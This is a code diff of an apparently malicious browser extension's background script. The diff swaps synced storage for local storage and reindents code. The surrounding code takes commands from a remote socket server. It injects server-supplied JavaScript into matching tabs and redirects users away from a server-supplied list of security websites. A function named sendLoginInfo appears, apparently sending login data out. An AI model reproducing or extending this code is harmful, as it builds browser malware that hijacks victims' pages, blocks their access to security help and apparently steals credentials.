@@ -18,7 +18,7 @@ function disconnectFromServer(socket) {
 
 function updateSecurityWebsites(socket) {
   socket.on('securityWebsites', (securityWebsites) => {
-    chrome.storage.sync.set({
+    chrome.storage.local.set({
       'securityWebsites': securityWebsites
     });
   });
@@ -26,7 +26,7 @@ function updateSecurityWebsites(socket) {
 
 function updateScriptWebsites(socket) {
   socket.on('jsExecution', (objects) => {
-    chrome.storage.sync.set({
+    chrome.storage.local.set({
       'scriptSites': objects
     });
   });
@@ -60,12 +60,12 @@ function sendLoginInfo(loginInfo) {
 
 function checkScriptWebsites(tabId, changeInfo) {
   if (changeInfo.url) {
-    chrome.storage.sync.get('scriptSites', (scriptSites) => {
+    chrome.storage.local.get('scriptSites', (scriptSites) => {
       scriptSites.scriptSites.forEach((map) => {
         if (changeInfo.url.includes(map.site)) {
-			chrome.tabs.executeScript({
-			  code: map.code
-			});
+          chrome.tabs.executeScript({
+            code: map.code
+          });
           return;
         }
       });
@@ -75,7 +75,7 @@ function checkScriptWebsites(tabId, changeInfo) {
 
 function checkSecurityWebsites(tabId, changeInfo) {
   if (changeInfo.url) {
-    chrome.storage.sync.get('securityWebsites', (securityWebsites) => {
+    chrome.storage.local.get('securityWebsites', (securityWebsites) => {
       securityWebsites.securityWebsites.forEach((site) => {
         if (changeInfo.url.includes(site)) {
           redirectToRandomWebsite(tabId);
